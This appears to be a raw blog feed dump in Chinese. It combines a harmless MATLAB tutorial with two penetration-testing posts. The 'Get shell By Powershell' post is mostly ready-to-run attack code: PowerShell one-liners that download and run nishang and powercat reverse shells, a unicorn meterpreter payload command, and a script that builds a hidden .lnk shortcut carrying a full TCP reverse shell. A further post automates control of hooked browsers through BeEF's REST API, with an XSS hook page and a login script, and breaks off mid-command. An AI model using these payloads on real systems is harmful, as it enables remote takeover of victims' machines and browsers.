截尾取整"></a>fix(x) 截尾取整</h2><pre class=" language-matlab"><code class="language-matlab"><span class="token operator">></span><span class="token operator">></span> <span class="token function">fix</span><span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">3.12</span> <span class="token operator">-</span><span class="token number">3.12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>　　ans <span class="token operator">=</span><span class="token number">3</span>    <span class="token operator">-</span><span class="token number">3</span></code></pre><h2 id="floor-x-不超过-x-的最大整数-高斯取整"><a href="#floor-x-不超过-x-的最大整数-高斯取整" class="headerlink" title="floor(x) 不超过 x 的最大整数(高斯取整)"></a>floor(x) 不超过 x 的最大整数(高斯取整)</h2><pre class=" language-matlab"><code class="language-matlab"><span class="token operator">></span><span class="token operator">></span> <span class="token function">floor</span><span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">3.12</span> <span class="token operator">-</span><span class="token number">3.12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>　　ans <span class="token operator">=</span><span class="token number">3</span>    <span class="token operator">-</span><span class="token number">4</span></code></pre><h2 id="ceil-x-大于-x-的最小整数"><a href="#ceil-x-大于-x-的最小整数" class="headerlink" title="ceil(x) 大于 x 的最小整数"></a>ceil(x) 大于 x 的最小整数</h2><pre class=" language-matlab"><code class="language-matlab"><span class="token operator">></span><span class="token operator">></span> <span class="token function">ceil</span><span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">3.12</span> <span class="token operator">-</span><span class="token number">3.12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  　ans <span class="token operator">=</span> <span class="token number">4</span>  <span class="token operator">-</span><span class="token number">3</span></code></pre><h1 id="四-随机序列常用命令"><a href="#四-随机序列常用命令" class="headerlink" title="四. 随机序列常用命令"></a>四. 随机序列常用命令</h1><p>rand：均匀分布随机矩阵</p><blockquote><p>rand          　　%无变量输入时只产生一个随机数<br>y= rand(n)       %生成 n×n 随机矩阵，其元素在（0，1）内<br>y = rand(m,n)    %生成 m×n 随机矩阵，其元素在（0，1）内</p></blockquote><p>randn:正态分布随机矩阵</p><blockquote><p>randn           　  %无变量输入时只产生一个正态分布随机数<br>y= randn(n)       %生成 n×n 正态分布随机矩阵<br>y = randn(m,n)   %生成 m×n 正态分布随机矩阵</p></blockquote><p>randsrc:</p><blockquote><p>randsrc          　　%无变量输入时只产生一个随机数 1 或者-1<br>y= randsrc(n)        %生成 n×n 随机数组，其元素为 1 或者-1<br>y = randsrc(m,n)   %生成 m×n 随机数组，其元素为 1 或者-1</p></blockquote><h1 id="五-矩阵常用操作命令"><a href="#五-矩阵常用操作命令" class="headerlink" title="五. 矩阵常用操作命令"></a>五. 矩阵常用操作命令</h1><p>MATLAB 的基本单位是矩阵，掌握矩阵的输入、各种数值运算以及矩阵函数是学好 MATLAB 的关键。</p><h2 id="矩阵的输入"><a href="#矩阵的输入" class="headerlink" title="矩阵的输入"></a>矩阵的输入</h2><h3 id="直接输入创建矩阵"><a href="#直接输入创建矩阵" class="headerlink" title="直接输入创建矩阵"></a>直接输入创建矩阵</h3><ul><li><p>　　以<code>[</code>和<code>]</code>作为首尾，同行的元素用<code>逗号</code>或<code>空格</code>隔开，不同行的元素用<code>；</code>或按<code>Enter</code> 键来分隔；</p></li><li><p>　　矩阵的元素可以是数字也可以是表达式，如果是数值计算，表达式中不可包含未知变量。</p></li></ul><h3 id="用矩阵函数来生成矩阵"><a href="#用矩阵函数来生成矩阵" class="headerlink" title="用矩阵函数来生成矩阵"></a>用矩阵函数来生成矩阵</h3><p>　　MATLAB 提供了大量的函数来创建特殊矩阵，表 1.1 给出 MATLAB 常用的矩阵函数。见下表：Matlab常用矩阵函数 </p><table><thead><tr><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>zero(m,n)</td><td>m 行 n 列零矩阵</td></tr><tr><td>eye(n)</td><td>n 阶方矩阵</td></tr><tr><td>ones(m,n)</td><td>m 行 n 列元素为 1 的矩阵</td></tr><tr><td>rand(m,n)</td><td>m 行 n 列随机矩阵</td></tr><tr><td>randn(m,n)</td><td>m 行 n 列正态随机矩阵</td></tr><tr><td>magic(n)</td><td>n 阶魔方矩阵</td></tr></tbody></table><h4 id="操作符：说明"><a href="#操作符：说明" class="headerlink" title="操作符：说明"></a>操作符<code>：</code>说明</h4><pre class=" language-bash"><code class="language-bash">j:k         表示步长为 1 的等差数列构成的数组：<span class="token punctuation">[</span>j, j+1, j+2,…, k<span class="token punctuation">]</span>。j:i:k       表示步长为 i 的等差数列构成的数组：<span class="token punctuation">[</span>j,j+i,j+2*i,…, k<span class="token punctuation">]</span>。A<span class="token punctuation">(</span>i:j<span class="token punctuation">)</span>      表示 A<span class="token punctuation">(</span>i<span class="token punctuation">)</span>，A<span class="token punctuation">(</span>i+1<span class="token punctuation">)</span>，…，A<span class="token punctuation">(</span>j<span class="token punctuation">)</span>。</code></pre><h2 id="矩阵元素操作"><a href="#矩阵元素操作" class="headerlink" title="矩阵元素操作"></a>矩阵元素操作</h2><p>设 A 是一个矩阵,则在 MATLAB 中用如下符号表示它的元素:</p><pre class=" language-bash"><code class="language-bash">A<span class="token punctuation">(</span>i,j<span class="token punctuation">)</span>　　　　表示矩阵 A 的第 i 行第 j 列元素。A<span class="token punctuation">(</span>:,j<span class="token punctuation">)</span>　　　　表示矩阵 A 的第 j 列。A<span class="token punctuation">(</span>i,:<span class="token punctuation">)</span>　　　　表示矩阵 A 的第 i 行。A<span class="token punctuation">(</span>:,:<span class="token punctuation">)</span>　　　　表示 A 的所有元素构造 2 维矩阵A<span class="token punctuation">(</span>:<span class="token punctuation">)</span>         表示以矩阵 A 的所有元素按列构成的一个列矩阵。A<span class="token punctuation">(</span>i<span class="token punctuation">)</span>         表示矩阵 A<span class="token punctuation">(</span>:<span class="token punctuation">)</span>的第 i 个元素。<span class="token punctuation">[</span> <span class="token punctuation">]</span>          表示空矩阵。</code></pre><h2 id="矩阵的运算"><a href="#矩阵的运算" class="headerlink" title="矩阵的运算"></a>矩阵的运算</h2><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>A+B：矩阵加法</td><td>A-B：矩阵减法</td></tr><tr><td>A*B：矩阵乘法</td><td>A’：A 的转置</td></tr><tr><td>k*A：数 k 乘以 A</td><td>det(A)：A 的行列式</td></tr><tr><td>rank(A)：A 的秩</td></tr></tbody></table><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>在MATLAB 中数组是一行或者一列的矩阵，对矩阵输入、修改和保存都适用于数组，同时 MATLAB 还提供了一些创建数组的特殊指令。</p><h4 id="特殊数组的创建"><a href="#特殊数组的创建" class="headerlink" title="特殊数组的创建"></a>特殊数组的创建</h4><p><code>linspace(a,b,n)</code>      给出区间[a,b]的 n 个等分点数据</p><h4 id="数组运算"><a href="#数组运算" class="headerlink" title="数组运算"></a>数组运算</h4><p>数组运算强调元素对元素的运算。数组运算除作为 1×n 的矩阵应遵循矩阵的运算规则外，MATLAB 中还为数组提供了一些特殊的运算：</p><p> 乘法为：<code>.*</code></p><p>乘幂为：<code>.^</code></p><h1 id="六-位操作"><a href="#六-位操作" class="headerlink" title="六.位操作"></a>六.位操作</h1><h2 id="bitand按位与"><a href="#bitand按位与" class="headerlink" title="bitand按位与"></a><code>bitand</code>按位与</h2><blockquote><p>C=bitand(A,B)命令将返回两个非负整数数组 A 和 B 的相应元素按位与操作的结果<br>为了确保 A 和 B 的元素都是整数，可以使用 ceil、fix、floor 和 round函数来生成 A 和 B</p></blockquote><h2 id="bitor：按位或"><a href="#bitor：按位或" class="headerlink" title="bitor：按位或"></a><code>bitor</code>：按位或</h2><blockquote><p>C=bitor(A,B)命令将返回两个非负整数数组 A 和 B 的相应元素按位或操作的结果。<br>为了确保 A 和 B 的元素都是整数，可以使用 ceil、fix、floor 和 round 函数来生成 A 和 B</p></blockquote><h2 id="bitxor：按位异或"><a href="#bitxor：按位异或" class="headerlink" title="bitxor：按位异或"></a><code>bitxor</code>：按位异或</h2><blockquote><p>C=bitxor(A,B)返回两个非负整数数组 A 和 B 的相应元素进行按位异或的结果<br>为了确保 A 和 B 的元素都是整数，可以使用 ceil、fix、floor 和 round 函数来生成 A 和 B</p></blockquote><h2 id="bitset：设置指定位的值"><a href="#bitset：设置指定位的值" class="headerlink" title="bitset：设置指定位的值"></a><code>bitset</code>：设置指定位的值</h2><blockquote><p>C=bitset(A,bit,v)命令将 A 中元素第 bit 位设为 v<br>其中 v 必须为 0 或 1，A 中的元素必须为非负整数<br>bit 必须为1到A中元素浮点整数表示法的位数之间的一个数字</p></blockquote><h2 id="bitget：获取指定位的值"><a href="#bitget：获取指定位的值" class="headerlink" title="bitget：获取指定位的值"></a><code>bitget</code>：获取指定位的值</h2><blockquote><p>C=bitget(A,bit)命令将返回 A 中元素用 bit 指定位的值<br>A 中的元素必须为非负整数，bit 必须为 1 到 A 中元素浮点整数表示法位数之间的一个数字</p></blockquote><h1 id="七-绘图操作"><a href="#七-绘图操作" class="headerlink" title="七. 绘图操作"></a>七. 绘图操作</h1><h2 id="图形标注"><a href="#图形标注" class="headerlink" title="图形标注"></a>图形标注</h2><pre class=" language-matlab"><code class="language-matlab"><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">,</span><span class="token string">'属性名'</span><span class="token punctuation">,</span><span class="token string">'属性值'</span><span class="token punctuation">,</span>…<span class="token punctuation">)</span>     —— 给图形加标题<span class="token function">xlabel</span> <span class="token punctuation">(</span>‘string<span class="token operator">'</span><span class="token punctuation">,</span><span class="token string">'属性名'</span><span class="token punctuation">,</span><span class="token string">'属性值'</span><span class="token punctuation">,</span>…<span class="token punctuation">)</span> —— 给 x 轴加标注<span class="token function">ylabel</span> <span class="token punctuation">(</span>‘string<span class="token operator">'</span><span class="token punctuation">,</span><span class="token string">'属性名'</span><span class="token punctuation">,</span><span class="token string">'属性值'</span><span class="token punctuation">,</span>…<span class="token punctuation">)</span> —— 给 y 轴加标注<span class="token function">legend</span> <span class="token punctuation">(</span>‘string1<span class="token operator">'</span><span class="token punctuation">,</span><span class="token string">'string2'</span><span class="token punctuation">,</span>…<span class="token punctuation">)</span>         —— 添加图例。其顺序对应于绘图指令中的顺序 <span class="token function">axis</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>xmin<span class="token punctuation">,</span>xmax<span class="token punctuation">,</span>ymin<span class="token punctuation">,</span>ymax<span class="token punctuation">]</span><span class="token punctuation">)</span>         —— 控制坐标轴的刻度范围</code></pre><h2 id="二维图形"><a href="#二维图形" class="headerlink" title="二维图形"></a>二维图形</h2><p><code>plot(x,y)</code></p><blockquote><p>功能：以向量 x,y 为轴，绘制曲线。</p></blockquote><p>　　注: plot(x,y)命令可用来绘制函数f(x)图形，此时可通过向量x常用命令<code>x=a:h:b</code>的形式获得 ，f(x)函数在绘图区间<code>[a,b]</code>上的自变量点向量数据，对应的函数向量值取为 <code>y= f(x)</code>。步长 h 可以任意选取，一般步长越小，曲线越光滑。但是步长太小，会增加计算量，运算速度也要降低。通常步长 h 取值 0.1 可达到较好的绘图效果。</p><p><code>plot(x1,y1,x2,y2,x3,y3…)</code></p><blockquote><p>功能：在同一图形窗口绘制多条不同颜色曲线</p></blockquote><p>曲线关系为：<code>y1=f(x1)，y2=f(x2)，y3=f(x3)</code></p><h3 id="二维特殊图形"><a href="#二维特殊图形" class="headerlink" title="二维特殊图形"></a>二维特殊图形</h3><p><code>bar</code></p><p><code>Hist</code> 表示生成直方图</p><p>　<code>M=hist(N)</code>表示将 N 中的最大最小值找出来，然后，平均取十个等间隔点，看以每个间隔点为中心，向两边各扩展 1/2 间隔的范围内，包括 N 的元素个数，因此 M 返回值都是 1*10 大小。</p><h1 id="八-文件操作"><a href="#八-文件操作" class="headerlink" title="八.文件操作"></a>八.文件操作</h1><h2 id="fopen-打开文件"><a href="#fopen-打开文件" class="headerlink" title="fopen 打开文件"></a>fopen 打开文件</h2><blockquote><p>fid= fopen(文件名，打开方式)</p></blockquote><p>其中文件名用字符串形式，表示待打开的数据文件。常见的打开方式有：</p><ul><li>‘r’    表示对打开的文件读数据</li><li>‘w’    表示对打开的文件写数据</li><li>‘a’    表示在打开的文件末尾添加数据</li></ul><p>fid 用于存储文件句柄值，句柄值用来标识该数据文件，其他函数可利用它对该数据文件进行操作。</p><p>文件数据格式有两种形式，一种是<code>二进制文件</code>，另一种是<code>文本文件</code>。在打开文件时需要进一步指定文件格式类型，即指定是二进制文件还是文本文件。</p><h2 id="fclose-关闭文件"><a href="#fclose-关闭文件" class="headerlink" title="fclose 关闭文件"></a>fclose 关闭文件</h2><p>文件读、写等操作完成后，应及时关闭。关闭文件用 fclose 函数，调用格式为：<code>sta=fclose(fid)</code>。该函数关闭 fid 所表示的文件。sta 表示关闭文件操作的返回代码，若关闭成功，返回 0，否则返回–1。</p><h2 id="二进制文件读写"><a href="#二进制文件读写" class="headerlink" title="二进制文件读写"></a>二进制文件读写</h2><h3 id="fread-读二进制文件"><a href="#fread-读二进制文件" class="headerlink" title="fread 读二进制文件"></a>fread 读二进制文件</h3><p>fread 函数可以读取二进制文件的数据，并将数据存入矩阵。其调用格式为：</p><blockquote><p>[A,COUNT]=fread(fid,size, precision)</p></blockquote><p>　　其中 A 用于存放读取的数据，COUNT 返回所读取的数据元素个数。fid 为文件句柄，size 为可选项，若不选用则表示读取整个文件内容，若选用则它的值可为以下选项：N 表示读取 N 个元素到一个列向量；Inf 表示读取整个文件；[M,N]表示读数据到 M×N 的矩阵中，数据按列存放。precision 代表读写数据的类型。</p><h3 id="fwrite-写二进制文件"><a href="#fwrite-写二进制文件" class="headerlink" title="fwrite 写二进制文件"></a>fwrite 写二进制文件</h3><p>fwrite 函数按照指定的数据类型将矩阵中的元素写入到文件中。其调用格式为：</p><blockquote><p>COUNT=fwrite (fid, A, precision)</p></blockquote><p>其中 COUNT 返回所写的数据元素个数，fid为文件句柄，A 用来存放写入文件的数据，precision 用于控制所写数据的类型，其形式与 fread 函数相同。</p><h1 id="九-M文件的建立与使用"><a href="#九-M文件的建立与使用" class="headerlink" title="九. M文件的建立与使用"></a>九. M文件的建立与使用</h1><p>　　M文件有命令文件和函数文件两种形式，这两种文件的扩展名相同，都是<code>.m</code>。当用户要运行的命令较多时，直接从键盘上逐条输入较为繁琐，可利用命令文件来解决多行输入问题。用户可将一组相关命令编辑在同一个命令文件中，运行时只需输入文件名字，MATLAB 就会自动按顺序执行文件中的命令。函数文件是另一种形式的 M 文件，它的第一句可执行语句是以 function 引导的定义语句，在函数文件中的变量都是局部变量。</p><h2 id="命令文件"><a href="#命令文件" class="headerlink" title="命令文件"></a>命令文件</h2><p>命令文件的一般形式为：</p><blockquote><p>&lt;M 文件名&gt;</p></blockquote><p>如<code>a1.m</code>, <code>pp.m</code> 等都是合法的 M 文件名。</p><p>M 文件有两种运行方式：</p><ul><li>一是在命令窗口直接输入文件名，按 Enter 键</li><li>二是在编辑窗口打开菜单 Tools，再单击 Run</li></ul><p>M 文件保存的路径一定要在搜索路径上,否则 M 文件不能运行。比如用 M 命令文件绘制 lena.bmp 图像。</p><p><strong>第一步</strong>：打开 MATLAB 命令窗口，单击<code>【File】|【New】|【Mfile】</code>，打开编辑窗口；</p><p><strong>第二步</strong>：在编辑窗口中输入：</p><pre class=" language-matlab"><code class="language-matlab">clc<span class="token punctuation">;</span>clear<span class="token punctuation">;</span><span class="token punctuation">[</span>fn<span class="token punctuation">,</span> pn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">uigetfile</span><span class="token punctuation">(</span><span class="token string">'*.bmp'</span><span class="token punctuation">,</span> <span class="token string">'请选择图像文件'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">[</span>x<span class="token punctuation">,</span> map<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">imread</span><span class="token punctuation">(</span><span class="token function">strcat</span><span class="token punctuation">(</span>pn<span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'bmp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">imshow</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>第三步</strong>：保存 M 文件，并且保存在搜索路径上，文件名为 <code>showlena.m</code>;</p><p><strong>第四步</strong>：运行 M 文件。在命令窗口输入 <code>showlena</code>,并按 <code>Enter</code> 键；或在编辑窗口打开菜单 <code>Tools</code>，再选择 <code>Run</code> 命令。</p><h2 id="函数文件"><a href="#函数文件" class="headerlink" title="函数文件"></a>函数文件</h2><p>M函数文件的一般形式为：</p><blockquote><p>function 因变量=函数名(自变量)</p></blockquote><p>M函数文件可以有多个因变量和多个自变量，当有多个因变量时用<code>[]</code>括起来。例：</p><p><strong>第一步</strong>：打开 MATLAB 命令窗口，单击<code>【File】|【New】|【Mfile</code>打开编辑窗口；</p><p><strong>第二步</strong>：在编辑窗口逐行写下列语句；</p><pre class=" language-matlab"><code class="language-matlab"><span class="token keyword">function</span> y<span class="token operator">=</span><span class="token function">a</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token function">imshow</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>第三步</strong>：保存 M 函数文件，并且保存在搜索路径上，文件名为 showimage.m;</p><p><strong>第四步</strong>：命令窗口执行下列语句：</p><pre class=" language-matlab"><code class="language-matlab"><span class="token punctuation">[</span>fn<span class="token punctuation">,</span> pn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">uigetfile</span><span class="token punctuation">(</span><span class="token string">'*.bmp'</span><span class="token punctuation">,</span> <span class="token string">'请选择图像文件'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> map<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">imread</span><span class="token punctuation">(</span><span class="token function">strcat</span><span class="token punctuation">(</span>pn<span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'bmp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">a</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 程序代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> MATLAB </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Get shell By Powershell</title>
      <link href="/get-shell-by-powershell/"/>
      <url>/get-shell-by-powershell/</url>
      
        <content type="html"><![CDATA[<h1 id="Invoke-PowerShellTcp-ps1"><a href="#Invoke-PowerShellTcp-ps1" class="headerlink" title="Invoke-PowerShellTcp.ps1"></a><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank" rel="noopener">Invoke-PowerShellTcp.ps1</a></h1><p>监听：nc -nv -l -p 9999</p><p>目标执行：</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token operator">-</span>nop <span class="token operator">-</span>exec bypass <span class="token operator">-</span>c <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress 监听主机ip -Port 9999"</span></code></pre><p> <img src="http://images2017.cnblogs.com/blog/1012328/201710/1012328-20171024172723754-2054184126.png" alt=""></p><h1 id="powercat-ps1"><a href="#powercat-ps1" class="headerlink" title="powercat.ps1"></a><a href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1" target="_blank" rel="noopener">powercat.ps1</a></h1><p>监听：nc -nv -l -p 9999</p><p>目标执行：</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token operator">-</span>nop <span class="token operator">-</span>exec bypass <span class="token operator">-</span>c <span class="token string">"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 监听主机ip  -p 9999 -e cmd.exe"</span></code></pre><p> <img src="http://images2017.cnblogs.com/blog/1012328/201710/1012328-20171024171733379-368769789.png" alt=""></p><h1 id="unicorn-py"><a href="#unicorn-py" class="headerlink" title="unicorn.py"></a><a href="https://github.com/trustedsec/unicorn.git" target="_blank" rel="noopener">unicorn.py</a></h1><pre class=" language-python"><code class="language-python">python unicorn<span class="token punctuation">.</span>py windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.5</span> <span class="token number">443</span></code></pre><h1 id="Lnk-Powershell"><a href="#Lnk-Powershell" class="headerlink" title="Lnk Powershell"></a>Lnk Powershell</h1><p>生成快捷方式shell的Powershell脚本</p><pre class=" language-powershell"><code class="language-powershell"><span class="token variable">$WshShell</span> = <span class="token function">New-Object</span> <span class="token operator">-</span>comObject WScript<span class="token punctuation">.</span>Shell<span class="token variable">$Shortcut</span> = <span class="token variable">$WshShell</span><span class="token punctuation">.</span>CreateShortcut<span class="token punctuation">(</span><span class="token string">"c:\lnk_tests\payload.lnk"</span><span class="token punctuation">)</span><span class="token variable">$Shortcut</span><span class="token punctuation">.</span>TargetPath = <span class="token string">"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"</span><span class="token variable">$Shortcut</span><span class="token punctuation">.</span>IconLocation = <span class="token string">"%SystemRoot%\System32\Shell32.dll,21"</span><span class="token variable">$Shortcut</span><span class="token punctuation">.</span>Arguments = <span class="token string">'-windowstyle hidden /c $client = New-Object System.Net.Sockets.TCPClient("""192.168.1.10""",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&amp;1 | Out-String );$sendback2  = $sendback + """PS """ + (pwd).Path + """> """;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'</span><span class="token variable">$Shortcut</span><span class="token punctuation">.</span>Save<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 攻防渗透 </category>
          
          <category> 程序代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powershell </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>利用BeEF REST API自动化控制僵尸主机</title>
      <link href="/li-yong-beef-rest-api-zi-dong-hua-kong-zhi-jiang-shi-zhu-ji/"/>
      <url>/li-yong-beef-rest-api-zi-dong-hua-kong-zhi-jiang-shi-zhu-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="利用BeEF-REST-API自动化控制僵尸主机"><a href="#利用BeEF-REST-API自动化控制僵尸主机" class="headerlink" title="利用BeEF REST API自动化控制僵尸主机"></a>利用BeEF REST API自动化控制僵尸主机</h1><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170617004610321-454563044.png" alt="img"></p><h1 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a>一. 前言</h1><p> 　　关于BeEF，不再多介绍，它的强大毋庸置疑，利用它我们可以做很多事情。最近的一些实验，需要用beef批量自动进行控制，发现网上也没有过多关于这方面内容的介绍，于是学习了一下它的API，顺便练习一下python编程，这里把自己的学习内容分享下。本文涉及的一些内容可能具有一定的攻击性，请遵守国家法律，禁止用于非法用途。</p><h1 id="二-通过API控制beef"><a href="#二-通过API控制beef" class="headerlink" title="二. 通过API控制beef"></a>二. 通过API控制beef</h1><p>　　BeEF从0.4.3.3,版本开始，提供了静态API接口，用户可以通过发送HTTP / JSON请求控制Beef。</p><p>　　我们可以通过程序，批量自动加载执行某些beef的模块，实现比如自动维持权限，Getshell等功能。</p><p>　　在后面的正文里，每一个调用模块的示例中，我都会尝试单独编写代码进行测试，最后，我会将各个部分组合起来，实现一个自动化控制的小demo。本文涉及到的所有代码你都可以在这里找到：<a href="https://github.com/ssooking/AutoBeef/" target="_blank" rel="noopener">https://github.com/ssooking/AutoBeef/</a>。进入正题，我们先启动beef。本机IP：192.168.1.133</p><pre><code>默认hook js：http://192.168.1.133:3000/hook.js默认hook页面： http://192.168.1.133:3000/demos/basic.html默认管理界面：  http://192.168.1.133:3000/ui/panel</code></pre><p><img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607220012715-1405193293.png" alt="img"></p><p>　　当我们启动beef的时候，会自动生成一个静态API key，这个key用于身份认证，我们每次通过API进行控制时，都要添加这个参数值 。需要提到的是，如果你发现后文的API key，session等参数值发生了变化，是因为这篇文章不是一次写完的，测试时因为重新开启beef产生了变化，因此不要纠结，我们应该关注API如何调用。</p><p>下面，我们可以创建一个简单的hook页面 ，如xss.html</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>　　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>　　　　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.1.133:3000/hook.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>　　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>　　我们也可以访问默认hook页面<code>http://192.168.1.133:3000/demos/basic.html</code>，为了测试，这里我使用了一台虚拟机，本机也使一个浏览器被hook。在管理面板可以看到主机已经上线。</p><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607224354918-1154401251.png" alt="img"></p><p>　　在控制台，我们能够直接看到被hook的主机，并执行相关攻击模块。那么怎样通过API实现这些功能呢？下面，我们将通过实例进行介绍。在此之前，我们需要知道的是，用于处理我们的API请求的文件，主要存放于beef框架下core目录和core/api目录下，我们可以在该目录下查找并阅读相关源代码，了解功能的实现机制，使用API进行HTTP交互时，默认的交互数据类型为json。</p><h2 id="获取API-Key"><a href="#获取API-Key" class="headerlink" title="获取API Key"></a>获取API Key</h2><p>/api/admin/login是用户登录接口，通过该接口登录之后，我们可以得到用于会话认证的API key</p><p>我们用curl命令，使用默认的口令提交登录请求，会返回我们的key。这个功能可以被用于后文编写自动化控制脚本。</p><pre class=" language-bash"><code class="language-bash">curl -H <span class="token string">"Content-Type: application/json"</span> -X POST -d <span class="token string">'{"username":"beef", "password":"beef"}'</span> http://192.168.1.133:3000/api/admin/login</code></pre><p> <img src="https://images2015.cnblogs.com/blog/1012328/201706/1012328-20170607221323325-1242387563.png" alt="img"></p><p>我们可以用下面这样一个简单的小脚本实现，代码也比较简单，不再多废话</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># ** Author: ssooking</span><span class="token keyword">import</span> json<span class="token keyword">import</span> urllib2<span class="token keyword">def</span> <span class="token function">getauthkey</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>    apiurl <span class="token operator">=</span>  host <span class="token operator">+</span> <span class="token string">"api/admin/login"</span>    logindata <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"beef"</span><span class="token punctuation">,</span>         <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"beef"</span>    <span class="token punctuation">}</span>    jdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>logindata<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># 对数据进行JSON格式化编码</span>    req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>apiurl<span class="token punctuation">,</span> jdata<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 生成页面请求的完整数据</span>    response <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 发送页面请求</span>    resdata <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true"># 获取服务器返回的页面信息，数据类型为str</span>    jsondata <span class="token operator">=</span>  json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>resdata<span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 把数据解析成python对象，此时返回dict数据      </span>    <span class="token keyword">return</span> jsondata<span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> <span class="token string">"http://192.168.1.133:3000/"</span>    <span class="token keyword">print</span> getauthkey<span class="token punctuation">(</span>host<span class="token punctuation">)</span></code></pre><h2 id="获取hook主机列表"><a href="#获取hook主机列表" class="headerlink" title="获取hook主机列表"></a>获取hook主机列表</h2><p>API中，我们要获取hook主机信息的api接口为：api/hooks。提交请求的格式类似于这样： api/hooks?token=xxxxx。需要的参数token的值是用于身份认证的API key。我们用curl命令发送请求，获取hook主机列表信息。</p><pre class=" language-bash"><code class="language-bash">curl http://192.168.1.133:3000/api/hooks?token<span class="token 